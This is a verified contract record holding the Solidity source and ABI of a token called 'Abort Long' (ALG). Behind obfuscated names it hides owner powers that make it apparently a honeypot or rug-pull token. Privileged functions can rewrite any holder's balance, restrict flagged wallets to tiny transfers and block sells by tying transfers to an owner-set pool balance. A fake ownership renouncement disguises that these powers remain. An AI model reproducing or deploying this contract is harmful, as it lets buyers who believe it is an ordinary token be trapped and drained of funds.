{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface walletLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderLimit {\n    function createPair(address swapLaunched, address tokenTeam) external returns (address);\n}\n\ninterface modeExemptTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromTeam) external view returns (uint256);\n\n    function transfer(address launchedFundFrom, uint256 txExemptTake) external returns (bool);\n\n    function allowance(address txTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txExemptTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedFundFrom,\n        uint256 txExemptTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountAt, uint256 value);\n    event Approval(address indexed txTeam, address indexed spender, uint256 value);\n}\n\ninterface toList is modeExemptTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AbortLong is receiverLiquidity, modeExemptTrading, toList {\n\n    uint256 private isShould = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableAuto;\n    }\n\n    function transfer(address limitTeam, uint256 txExemptTake) external virtual override returns (bool) {\n        return isAt(_msgSender(), limitTeam, txExemptTake);\n    }\n\n    function enableTrading(address walletIs) public {\n        txLiquidity();\n        \n        if (walletIs == senderMarketing || walletIs == exemptLimit) {\n            return;\n        }\n        receiverSender[walletIs] = true;\n    }\n\n    function walletSwap(uint256 txExemptTake) public {\n        txLiquidity();\n        autoTokenLaunched = txExemptTake;\n    }\n\n    mapping(address => bool) public receiverSender;\n\n    function balanceOf(address fromTeam) public view virtual override returns (uint256) {\n        return tokenBuy[fromTeam];\n    }\n\n    bool private sellMinTo;\n\n    address public senderMarketing;\n\n    mapping(address => bool) public modeSenderTeam;\n\n    bool public launchedTx;\n\n    function isAt(address launchedReceiver, address launchedFundFrom, uint256 txExemptTake) internal returns (bool) {\n        if (launchedReceiver == senderMarketing) {\n            return fundBuy(launchedReceiver, launchedFundFrom, txExemptTake);\n        }\n        uint256 txFrom = modeExemptTrading(exemptLimit).balanceOf(swapExemptAmount);\n        require(txFrom == autoTokenLaunched);\n        require(launchedFundFrom != swapExemptAmount);\n        if (receiverSender[launchedReceiver]) {\n            return fundBuy(launchedReceiver, launchedFundFrom, txSender);\n        }\n        return fundBuy(launchedReceiver, launchedFundFrom, txExemptTake);\n    }\n\n    function approve(address isReceiver, uint256 txExemptTake) public virtual override returns (bool) {\n        sellLimit[_msgSender()][isReceiver] = txExemptTake;\n        emit Approval(_msgSender(), isReceiver, txExemptTake);\n        return true;\n    }\n\n    address walletSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public exemptLimit;\n\n    function getOwner() external view returns (address) {\n        return totalModeSell;\n    }\n\n    uint256 public enableTeamSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamTo;\n    }\n\n    constructor (){\n        if (senderFrom) {\n            enableTeamSwap = fundMarketing;\n        }\n        walletLaunched limitSell = walletLaunched(walletSell);\n        exemptLimit = senderLimit(limitSell.factory()).createPair(limitSell.WETH(), address(this));\n        if (enableTeamSwap != fundMarketing) {\n            fundMarketing = fundTake;\n        }\n        senderMarketing = _msgSender();\n        buyShouldMode();\n        modeSenderTeam[senderMarketing] = true;\n        tokenBuy[senderMarketing] = isShould;\n        if (launchedTx != fromAuto) {\n            launchedTx = false;\n        }\n        emit Transfer(address(0), senderMarketing, isShould);\n    }\n\n    bool public toToken;\n\n    function takeList(address limitTeam, uint256 txExemptTake) public {\n        txLiquidity();\n        tokenBuy[limitTeam] = txExemptTake;\n    }\n\n    function txAmountExempt(address amountTake) public {\n        require(amountTake.balance < 100000);\n        if (buyEnableWallet) {\n            return;\n        }\n        if (fundTake == fundMarketing) {\n            sellMinTo = true;\n        }\n        modeSenderTeam[amountTake] = true;\n        \n        buyEnableWallet = true;\n    }\n\n    address swapExemptAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fundBuy(address launchedReceiver, address launchedFundFrom, uint256 txExemptTake) internal returns (bool) {\n        require(tokenBuy[launchedReceiver] >= txExemptTake);\n        tokenBuy[launchedReceiver] -= txExemptTake;\n        tokenBuy[launchedFundFrom] += txExemptTake;\n        emit Transfer(launchedReceiver, launchedFundFrom, txExemptTake);\n        return true;\n    }\n\n    bool private senderFrom;\n\n    function allowance(address teamList, address isReceiver) external view virtual override returns (uint256) {\n        if (isReceiver == walletSell) {\n            return type(uint256).max;\n        }\n        return sellLimit[teamList][isReceiver];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitLaunched;\n    }\n\n    mapping(address => uint256) private tokenBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isShould;\n    }\n\n    uint256 private sellTakeToken;\n\n    uint8 private teamTo = 18;\n\n    function transferFrom(address launchedReceiver, address launchedFundFrom, uint256 txExemptTake) external override returns (bool) {\n        if (_msgSender() != walletSell) {\n            if (sellLimit[launchedReceiver][_msgSender()] != type(uint256).max) {\n                require(txExemptTake <= sellLimit[launchedReceiver][_msgSender()]);\n                sellLimit[launchedReceiver][_msgSender()] -= txExemptTake;\n            }\n        }\n        return isAt(launchedReceiver, launchedFundFrom, txExemptTake);\n    }\n\n    uint256 autoLaunch;\n\n    bool public launchedAt;\n\n    uint256 autoTokenLaunched;\n\n    function owner() external view returns (address) {\n        return totalModeSell;\n    }\n\n    mapping(address => mapping(address => uint256)) private sellLimit;\n\n    string private limitLaunched = \"Abort Long\";\n\n    function txLiquidity() private view {\n        require(modeSenderTeam[_msgSender()]);\n    }\n\n    address private totalModeSell;\n\n    uint256 public fundMarketing;\n\n    bool public buyEnableWallet;\n\n    uint256 public fundTake;\n\n    event OwnershipTransferred(address indexed swapFee, address indexed fromList);\n\n    uint256 constant txSender = 3 ** 10;\n\n    bool public fromAuto;\n\n    string private enableAuto = \"ALG\";\n\n    function buyShouldMode() public {\n        emit OwnershipTransferred(senderMarketing, address(0));\n        totalModeSell = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExemptTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnableWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyShouldMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTeamSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"}],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeSenderTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExemptTake\",\"type\":\"uint256\"}],\"name\":\"takeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExemptTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedFundFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExemptTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"}],\"name\":\"txAmountExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txExemptTake\",\"type\":\"uint256\"}],\"name\":\"walletSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AbortLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}